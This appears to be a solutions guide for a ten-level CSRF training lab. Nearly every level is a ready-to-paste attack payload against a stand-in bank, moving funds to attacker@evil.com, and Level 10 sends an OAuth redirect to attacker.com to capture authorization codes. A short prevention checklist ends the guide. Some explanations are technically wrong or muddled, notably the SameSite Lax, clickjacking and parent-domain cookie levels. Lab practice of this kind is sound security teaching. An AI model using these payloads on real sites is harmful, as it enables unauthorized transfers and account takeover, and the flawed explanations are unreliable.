# CSRF Challenge Solutions Guide

## Level 1: No CSRF Protection - Basic Form-Based Attack

**Solution:**
```html
<form method="POST" action="http://bank.com/transfer" style="display:none;">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>
  document.forms[0].submit();
</script>
```

**Explanation:** No CSRF token means the server trusts any request from an authenticated user. The hidden form automatically submits when the user visits the attacker's page.

---

## Level 2: Predictable Token - Guess Sequential Tokens

**Solution:**
```html
<form method="POST" action="http://bank.com/transfer">
  <input type="hidden" name="csrf_token" value="token_5">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <button type="submit">Claim Prize</button>
</form>
```

**Explanation:** Tokens follow a predictable sequential pattern (token_1, token_2, token_3...). By analyzing previous tokens, you can predict the next one.

---

## Level 3: Token Not Refreshed - Reuse Same Token

**Solution:**
```html
<form method="POST" action="http://bank.com/transfer" style="display:none;">
  <input type="hidden" name="csrf_token" value="reusable_csrf_token_12345">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="50">
</form>
<script>
  // First submission
  document.forms[0].submit();
  
  // Second submission with same token (5 seconds later)
  setTimeout(() => {
    document.forms[0].action = "http://bank.com/transfer2";
    document.forms[0].submit();
  }, 5000);
</script>
```

**Explanation:** Once a token is captured, it can be reused indefinitely because the server doesn't invalidate it after use.

---

## Level 4: SameSite Bypass (Lax) - Top-Level Navigation

**Solution:**
```html
<!-- Option 1: Link click (top-level navigation) -->
<a href="http://bank.com/transfer?to=attacker@evil.com&amount=100&confirm=yes" 
   style="display:block; padding: 20px; background: blue; color: white; text-decoration: none;">
  Claim Your Prize!
</a>

<!-- Option 2: Window location (top-level navigation) -->
<script>
  window.location = "http://bank.com/transfer?to=attacker@evil.com&amount=100";
</script>
```

**Explanation:** SameSite=Lax allows cookies on top-level navigations (like clicks on links or using window.location). Regular form submissions still include cookies.

---

## Level 5: Custom Header Bypass - Use Regular Form

**Solution:**
```html
<form method="POST" action="http://api.bank.com/transfer" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <button type="submit">Proceed</button>
</form>
```

**Explanation:** Regular HTML forms don't send custom headers like X-Requested-With. Only JavaScript requests can add custom headers, which can be blocked. Forms bypass this.

---

## Level 6: Double-Submit Cookie - Exploit Domain Scope

**Solution:**
```javascript
<script>
  // Set cookie on parent domain (if possible)
  document.cookie = "csrf_token=parent_domain_cookie_token; domain=.example.com; path=/";
  
  // Now use form on subdomain with parent domain's token
  fetch("http://bank.example.com/transfer", {
    method: "POST",
    credentials: "include",
    body: new FormData(document.querySelector("form"))
  });
</script>
```

**Explanation:** Cookies set on parent domains affect all subdomains. If validation doesn't check exact domain match, parent domain cookies can compromise subdomains.

---

## Level 7: Content-Type Confusion - Use Form-Encoded

**Solution:**
```javascript
fetch("http://api.bank.com/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  credentials: "include",
  body: "to=attacker@evil.com&amount=100&_token="
});
```

**Explanation:** APIs that accept multiple content types may have different CSRF protections. Form-encoded might not require tokens while JSON does.

---

## Level 8: Clickjacking - Overlay Transparent Iframe

**Solution:**
```html
<div style="position: relative; width: 500px; height: 300px;">
  <!-- Attacker's content (visible) -->
  <div style="z-index: 1; position: relative;">
    <button style="padding: 20px; font-size: 20px; cursor: pointer;">
      Click to Claim Free Prize!
    </button>
  </div>
  
  <!-- Target site iframe (transparent, on top) -->
  <iframe src="http://bank.com/transfer?to=attacker@evil.com&amount=100&confirm=yes"
    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            opacity: 0; z-index: 2; cursor: pointer;">
  </iframe>
</div>
```

**Explanation:** Even if CSRF tokens are present, users still click the button genuinely. The iframe is invisible, so they don't know they're performing an action on the bank's site.

---

## Level 9: Session Fixation + CSRF - Combined Attack

**Solution:**
```javascript
<script>
  // 1. Attacker first establishes their known session (e.g., session=ATTACKER_SESSION_ID)
  // 2. Attacker gets the CSRF token from that known session
  // 3. Send request with both known session ID and captured token
  
  fetch("http://bank.com/transfer", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      csrf_token: "fixed_session_csrf_token",
      to: "attacker@evil.com",
      amount: 100
    })
  });
</script>
```

**Explanation:** Session fixation + CSRF is a combined attack. Attacker controls the session ID and knows the CSRF token tied to it, completely bypassing protection.

---

## Level 10: OAuth State Parameter Bypass - Weak Validation

**Solution:**
```javascript
<script>
  // Redirect to OAuth with any state value (weak validation)
  window.location = "http://bank.com/oauth/authorize?" +
    "client_id=legitimate_app" +
    "&redirect_uri=http://attacker.com/callback" +
    "&state=any_random_value";  // Weak validation allows any value
  
  // When callback comes back with code, exchange it for attacker's benefit
</script>
```

**Explanation:** OAuth requires a state parameter for CSRF protection. If validation only checks existence (not validity), attackers can use any state value to bypass it.

---

## Testing Your Solutions

1. Copy the solution code from the "Solution" button on each level
2. Paste it into the "Attack Payload" textarea
3. Click "Submit Attack" to verify it works
4. Move to the next level

## Prevention Checklist

- ✅ Use strong, unpredictable CSRF tokens (generated cryptographically)
- ✅ Regenerate tokens after each request
- ✅ Validate tokens on every state-changing request
- ✅ Use SameSite=Strict cookies
- ✅ Validate Origin and Referer headers
- ✅ Use X-Frame-Options: DENY to prevent clickjacking
- ✅ Regenerate session IDs after login
- ✅ Implement proper OAuth state parameter validation
- ✅ Combine multiple defense layers (defense in depth)
